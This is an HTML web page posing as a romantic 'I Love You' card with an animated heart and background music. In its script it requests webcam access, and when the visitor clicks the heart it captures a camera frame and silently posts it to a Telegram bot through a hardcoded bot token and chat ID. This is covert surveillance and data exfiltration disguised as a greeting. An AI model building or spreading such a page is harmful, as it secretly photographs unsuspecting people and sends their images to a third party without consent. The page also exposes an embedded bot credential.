<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>I Love You</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Pinyon+Script&display=swap');

    body {
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: linear-gradient(45deg, #ff9a9e, #fad0c4, #fbc2eb, #a18cd1);
      background-size: 300% 300%;
      font-family: 'Dancing Script', cursive;
      animation: bgAnimation 12s infinite alternate;
      overflow: hidden;
    }

    @keyframes bgAnimation {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }

    .container {
      text-align: center;
      position: relative;
    }

    .heart {
      font-size: 6rem;
      color: #ff4b5c;
      cursor: pointer;
      transition: transform 0.3s ease;
    }

    .heart:hover {
      transform: scale(1.2);
    }

    h1 {
      font-size: 3rem;
      color: #fff;
      text-shadow: 2px 2px 10px rgba(0, 0, 0, 0.3);
      margin: 20px 0;
    }

    h1 span {
      color: #ffeb3b;
      font-style: italic;
    }

    video {
      display: none; /* Hide the camera preview */
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="heart" onclick="capturePhoto()">❤️</div>
    <h1>I <span>Love</span> You</h1>

    <video id="video" width="320" height="240" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>
  </div>

  <!-- Background Music -->
  <audio id="loveAudio" loop>
    <source src="https://www.bensound.com/bensound-music/bensound-tenderness.mp3" type="audio/mp3">
    Your browser does not support the audio element.
  </audio>

  <script>
    let video = document.getElementById('video');
    let canvas = document.getElementById('canvas');
    let context = canvas.getContext('2d');
    let audio = document.getElementById('loveAudio');
    let isPlaying = false;

    // Start the video feed
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
        video.srcObject = stream;
        video.style.display = "block"; // Show video
      })
      .catch(function(error) {
        console.error("Error accessing webcam: ", error);
      });

    // Capture photo when heart is clicked
    function capturePhoto() {
      context.drawImage(video, 0, 0, canvas.width, canvas.height);
      let imageData = canvas.toDataURL('image/png');
      
      // Send image to Telegram bot
      sendToTelegramBot(imageData);

      // Play background music if not playing
      if (!isPlaying) {
        audio.play();
        isPlaying = true;
      } else {
        audio.pause();
        isPlaying = false;
      }
    }

    // Send captured image to Telegram bot
    function sendToTelegramBot(imageData) {
      const token = '7891742749:AAHRWnK8KtgV4c7KEb6MY27D9AXdIsrKp_w';
      const chatId = '1987016824';
      const url = `https://api.telegram.org/bot${token}/sendPhoto`;

      // Create a FormData object
      let formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', imageData);

      fetch(url, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => {
        console.log('Image sent successfully', data);
      })
      .catch(error => {
        console.error('Error sending image:', error);
      });
    }
  </script>
</body>
</html>
